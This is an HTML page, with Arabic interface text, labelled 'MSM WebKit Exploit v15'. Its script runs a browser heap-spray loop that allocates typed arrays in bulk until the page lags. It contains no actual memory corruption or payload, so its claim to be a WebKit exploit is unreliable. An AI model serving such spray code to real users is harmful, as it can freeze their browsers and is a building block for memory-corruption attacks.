<!DOCTYPE html>
<html>
  <head>
    <title>MSM WebKit Exploit v15</title>
    <meta charset="UTF-8" />
    <style>
      body {
        background-color: #0d0d0d;
        color: #00ccff;
        font-family: monospace;
        text-align: center;
        padding-top: 50px;
      }
      button {
        padding: 14px 28px;
        background-color: #00ccff;
        color: black;
        border: none;
        font-size: 22px;
        cursor: pointer;
        margin: 10px;
      }
      #status, #timer, #counter, #report {
        margin-top: 20px;
        font-size: 18px;
        white-space: pre-wrap;
      }
    </style>
  </head>
  <body>
    <h1>⚡ MSM WebKit Exploit v15 – الضغط الفائق السرعة</h1>
    <button onclick="startInfiniteSpray()">🚀 ابدأ الضغط الفائق</button>
    <button onclick="saveReport()">📝 سجل النتائج</button>
    <p id="timer">⏱️ المؤقت: 0 ثانية</p>
    <p id="counter">🔢 التكرارات: 0</p>
    <p id="status">جاهز للتفجير...</p>
    <div id="report"></div>

    <script>
      let seconds = 0;
      let counter = 0;
      let timerInterval = null;
      let sprayActive = false;

      function startTimer() {
        clearInterval(timerInterval);
        seconds = 0;
        counter = 0;
        document.getElementById("timer").innerText = "⏱️ المؤقت: 0 ثانية";
        document.getElementById("counter").innerText = "🔢 التكرارات: 0";
        timerInterval = setInterval(() => {
          seconds++;
          document.getElementById("timer").innerText = `⏱️ المؤقت: ${seconds} ثانية`;
        }, 1000);
      }

      function stopTimer() {
        clearInterval(timerInterval);
      }

      function startInfiniteSpray() {
        if (sprayActive) return;
        sprayActive = true;
        startTimer();
        const status = document.getElementById("status");
        status.innerText = "⏳ MSM: بدأ الضغط الفائق السرعة...";
        let lastLagCheck = performance.now();

        function sprayLoop() {
          for (let i = 0; i < 30000; i++) {
            let spray = new Uint32Array(2048);
            spray.fill(counter);
            counter++;
          }

          document.getElementById("counter").innerText = `🔢 التكرارات: ${counter}`;
          let now = performance.now();
          let delta = now - lastLagCheck;
          lastLagCheck = now;

          if (delta > 300) {
            status.innerText = "💥 MSM: تم الكشف عن تجميد – تم إيقاف الضغط!";
            stopTimer();
            sprayActive = false;
            return;
          }

          requestAnimationFrame(sprayLoop);
        }

        sprayLoop();
      }

      function saveReport() {
        const report = `
# تقرير MSM WebKit Exploit
- الوقت الإجمالي: ${seconds} ثانية
- عدد التكرارات: ${counter}
- الحالة: ${document.getElementById("status").innerText}
-------------------------------
`;
        document.getElementById("report").innerText = report;
      }
    </script>
  </body>
</html>
